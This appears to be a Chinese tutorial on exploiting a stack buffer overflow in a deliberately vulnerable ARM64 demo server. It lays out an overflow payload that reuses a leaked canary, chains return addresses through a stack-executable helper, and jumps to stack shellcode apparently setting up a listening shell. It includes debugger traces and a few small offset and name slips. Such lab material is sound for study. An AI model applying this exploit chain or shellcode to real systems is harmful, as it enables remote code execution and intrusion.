# 缓冲区溢出示例

> 程序名为: StackOverflowSP

示例的为默认的编译选项，相应的安全机制如下:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
Partial RELRO   Canary found      NX enabled    Not an ELF file   No RPATH   No RUNPATH 

```

开启了栈保护，为了演示这个漏洞，我们对连接进来的客户端发送`canary random`值，以方便绕过其栈保护。



因为开启了栈保护，编译器打乱了我们变量的顺序，原顺序如下:

```
    int serv_sock = 0 ;
    int clnt_sock = 0;

    struct sockaddr_in serv_addr = {0};
    struct sockaddr_in clnt_addr = {0};
    socklen_t clnt_addr_size = 0;
    char recv_buf[MAX_RECV] = {0} ;
    int nRecv = 0 ;
    int nContinue = 1 ;
    int i = 0 ;
    PFN_CLEAN pClean = cleansock ;
```

反汇编后发现其顺序如下:

```
.text:0000000000401664 var_1000        = -0x1000
.text:0000000000401664 var_70          = -0x70
.text:0000000000401664 clnt_addr_size  = -0x58
.text:0000000000401664 nRecv           = -0x54
.text:0000000000401664 nContinue       = -0x50
.text:0000000000401664 i               = -0x4C
.text:0000000000401664 serv_sock       = -0x48
.text:0000000000401664 clnt_sock       = -0x44
.text:0000000000401664 pClean          = -0x40
.text:0000000000401664 serv_addr       = -0x38
.text:0000000000401664 clnt_addr       = -0x28
.text:0000000000401664 recv_buf        = -0x18
.text:0000000000401664 var_8           = -8
```

其中`recv_buf`为接收 `buf`,长度为`16`,`var_8`为`canary_random`值，我们进行缓冲区溢出时，不能将此值覆盖掉，需要用服务器接收到的`canary_random`值进行覆盖，此值之后为上一层函数栈数据，`x29`存储在`canary_random`后面，再接着在`x29`后面的是`x30`值，为上一层函数的返回地址。

我们构造溢出数据结构如下:

```
0x00: 随便值
0x08: 随便填
0x10: 从服务器接收到的canary_random值
0x18: 原函数sp寄存器值
0x20: lr寄存器值，为原函数返回地址,这里需要替换为我们的返回地址
```

将`0x20`填充为我的提前写进代码里面的后门代码，即可完成最简单的缓冲区溢出。



# 更为复杂一点的缓冲区溢出

现在可以实现更复杂一些的缓冲区溢出，执行栈上的`shellcode`，过程分两步，第一步是先让其执行给栈加执行权限函数，接着再让其执行我们的`shellcode`。

我们先在程序中找到我们的`PassNX`函数

```
.text:0000000000402134 ; int __cdecl PassNX()
.text:0000000000402134                 EXPORT PassNX
.text:0000000000402134 PassNX
.text:0000000000402134
.text:0000000000402134 var_20          = -0x20
.text:0000000000402134 nError          = -0xC
.text:0000000000402134 var_8           = -8
.text:0000000000402134
.text:0000000000402134                 STP             X29, X30, [SP,#var_20]!
.text:0000000000402138                 MOV             X29, SP
```

`0x402134`为`PassNX`函数地址，为我们第一步要跳转的地方，相应的`exploit`应该如下:

```
0x00: 随便值
0x08: 随便填
0x10: 从服务器接收到的canary_random值
0x18: 原函数sp寄存器值
0x20: lr寄存器值，为原函数返回地址,这里地址设为0x402134
```

接着直接调试进行分析数据应该如何填充，我们直接在`StartServer`函数尾部下断点，关注其栈的变化，

```
(gdb) x/16xg $sp
0x7ffffff030:   0x0000007ffffff0a0      0x0000000000401658
0x7ffffff040:   0x0000000000000000      0x000001e800000010
0x7ffffff050:   0x0000000800000000      0x0000000400000003
0x7ffffff060:   0x0000000000402340      0x00000000d2040002
0x7ffffff070:   0x0000000000000000      0x0100007f0eca0002
0x7ffffff080:   0x0000000000000000      0x3736353433323130
0x7ffffff090:   0x1111111111111111      0x2ee88c9920b9cd00
0x7ffffff0a0:   0x0000007ffffff0d0      0x0000000000402138
0x7ffffff0b0:   0x0000007ffffff0f0      0x6161616161616161
0x7ffffff0c0:   0x3335333433333332      0x3439333833373336
```

执行`ldp     x29, x30, [sp],#112`指令之后，其栈结果如下:

```
0x7ffffff0a0:   0x0000007ffffff0d0      0x0000000000402138
0x7ffffff0b0:   0x0000007ffffff0f0      0x6161616161616161
0x7ffffff0c0:   0x3335333433333332      0x3439333833373336
0x7ffffff0d0:   0x0000007ffffff0f0      0x0000007ffffff1b0
0x7ffffff0e0:   0x3531353035393438      0x3535353435333532
0x7ffffff0f0:   0x3639353835373536      0x3633363236313630
0x7ffffff100:   0x3637363636353634      0x3731373037393638
0x7ffffff110:   0x3735373437333732      0x3839373837373736
0x7ffffff120:   0x3833383238313830      0x3837383638353834
0x7ffffff130:   0x3931393039393838      0x3935393439333932
```

其主要寄存器值如下:

```
x29            0x7ffffff0a0     549755809952
x30            0x401658 4200024
sp             0x7ffffff0a0     0x7ffffff0a0
pc             0x401970 0x401970 <StartServer+780>
```

因为`arm`体系函数调用函数是进入函数之后，将原函数的栈底指针、返回地址存入在栈的顶部，在之后才是栈中变量，也就是当前函数溢出之后，覆盖的是上一层函数的返回地址，所以这里的`lr(x30)`寄存器的值是`0x401658`，接着往下面跟

```
   0x0000000000401654 <+368>:   bl      0x401664 <StartServer>
=> 0x0000000000401658 <+372>:   mov     w0, #0x0                        // #0
   0x000000000040165c <+376>:   ldp     x29, x30, [sp],#48
   0x0000000000401660 <+380>:   ret
```

执行完`ldp     x29, x30, [sp],#48`之后，其关键寄存器值如下:

```
x28            0x0      0
x29            0x7ffffff0d0     549755810000
x30            0x402138 4202808
sp             0x7ffffff0d0     0x7ffffff0d0
pc             0x401660 0x401660 <main+380>
```

执行`ret`之后，即可转到我们指定的`PassNE`函数中

直接执行到`PassNE`尾部

```
   0x00000000004021cc <PassNX+152>:     40 00 00 54     b.eq    0x4021d4 <PassNX+160>
   0x00000000004021d0 <PassNX+156>:     08 fc ff 97     bl      0x4011f0 <__stack_chk_fail@plt>
=> 0x00000000004021d4 <PassNX+160>:     fd 7b c2 a8     ldp     x29, x30, [sp],#32
   0x00000000004021d8 <PassNX+164>:     c0 03 5f d6     ret
```

观察其寄存器值如下:

```
x29            0x7ffffff0d0     549755810000
x30            0x40217c 4202876
sp             0x7ffffff0d0     0x7ffffff0d0
pc             0x4021d4 0x4021d4 <PassNX+160>
```

栈数据如下:

```
0x7ffffff0d0:   0x0000007ffffff0f0      0x0000007ffffff1b0
0x7ffffff0e0:   0x0000000035393438      0x2ee88c9920b9cd00
0x7ffffff0f0:   0x3639353835373536      0x3633363236313630
0x7ffffff100:   0x3637363636353634      0x3731373037393638
0x7ffffff110:   0x3735373437333732      0x3839373837373736
0x7ffffff120:   0x3833383238313830      0x3837383638353834
0x7ffffff130:   0x3931393039393838      0x3935393439333932
0x7ffffff140:   0x3139393839373936      0x3230313130313030
0x7ffffff150:   0x3031343031333031      0x3137303136303135
0x7ffffff160:   0x3031313930313830      0x3332313031313131
0x7ffffff170:   0x3130393837363534      0x3133313231313130
0x7ffffff180:   0x3137313631353134      0x3231323032393138
0x7ffffff190:   0x3235323432333232      0x3339323832373236
0x7ffffff1a0:   0x1111111111111111      0x3337333633353334
0x7ffffff1b0:   0xd347fd01d28018c8      0xaa1f03e2d37ff820
0x7ffffff1c0:   0xaa2003e4d40266e1      0xf2ab8221d37ff821
```

执行完`ldp     x29, x30, [sp],#32`指令之后，其寄存器值如下:

```
x29            0x7ffffff0f0     549755810032
x30            0x7ffffff1b0     549755810224
sp             0x7ffffff0f0     0x7ffffff0f0
pc             0x4021d8 0x4021d8 <PassNX+164>
```

下一步即转入执行我们指定的栈中的`shellcode`地址

```
(gdb) x/32i $pc
=> 0x7ffffff1b0:        mov     x8, #0xc6                       // #198
   0x7ffffff1b4:        lsr     x1, x8, #7
   0x7ffffff1b8:        lsl     x0, x1, #1
   0x7ffffff1bc:        mov     x2, xzr
   0x7ffffff1c0:        svc     #0x1337
   0x7ffffff1c4:        mvn     x4, x0
   0x7ffffff1c8:        lsl     x1, x1, #1
   0x7ffffff1cc:        movk    x1, #0x5c11, lsl #16
   0x7ffffff1d0:        str     x1, [sp,#-8]!
   0x7ffffff1d4:        add     x1, sp, x2
   0x7ffffff1d8:        mov     x2, #0x10                       // #16
   0x7ffffff1dc:        mov     x8, #0xc8                       // #200
   0x7ffffff1e0:        svc     #0x1337
   0x7ffffff1e4:        mvn     x0, x4
   0x7ffffff1e8:        lsr     x1, x2, #3
   0x7ffffff1ec:        mov     x8, #0xc9                       // #201
   0x7ffffff1f0:        svc     #0x1337
   0x7ffffff1f4:        mov     x5, x1
   0x7ffffff1f8:        mvn     x0, x4
   0x7ffffff1fc:        mov     x1, xzr
   0x7ffffff200:        mov     x2, xzr
   0x7ffffff204:        mov     x8, #0xca                       // #202
   0x7ffffff208:        svc     #0x1337
   0x7ffffff20c:        mvn     x4, x0
   0x7ffffff210:        lsl     x1, x5, #1
   0x7ffffff214:        mvn     x0, x4
   0x7ffffff218:        lsr     x1, x1, #1
   0x7ffffff21c:        mov     x2, xzr
   0x7ffffff220:        mov     x8, #0x18                       // #24
   0x7ffffff224:        svc     #0x1337
   0x7ffffff228:        mov     x10, xzr
   0x7ffffff22c:        cmp     x10, x1
```

因`PassNE`已经将当前栈设为可执行，所以上面的`Shellcode`可以正常执行

通过上面的测试数据我们发现，我们的数据是存储在栈`0x7ffffff088起始处`，所以溢出数据构造如下:

```
(0x0x7ffffff088)0x00: 随便值
(0x7ffffff090)0x08: 随便填
(0x7ffffff098)0x10: 从服务器接收到的canary_random值
(0x7ffffff0a0)0x18: 原函数sp寄存器值，我们将这里的值设为0x0000007ffffff0d0，同时也表明我们要在这里相对应的偏移处填写相应的值
(0x7ffffff0a8)0x20: lr寄存器值，为原函数返回地址,这里地址设为0x402138,跳过函数前的第一条指令
(0x7ffffff0b0)0x30:随便填
(0x7ffffff0b8)0x38:随便填
(0x7ffffff0c0)0x40:随便填
(0x7ffffff0c8)0x48:原函数sp寄存器值，这里随便填一个可用的，我们就填0x0000007ffffff0d0
(0x7ffffff0d0)0x50:lr寄存器值,为原函数返回地址，这里我们指向我们的`shellcode`,我们存放在0x7ffffff1b0处,当然要往前面移也是可以的，为了方便构造更多的rop链，这里先留空
(0x7ffffff0d8)0x58:随便填
(0x7ffffff0e0)0x60:随便填
(0x7ffffff0e8)0x68:随便填
(0x7ffffff0f0)0x70:随便填
(0x7ffffff0f8)0x78:随便填
......
(0x7ffffff1b0)0x128:shellcode
```

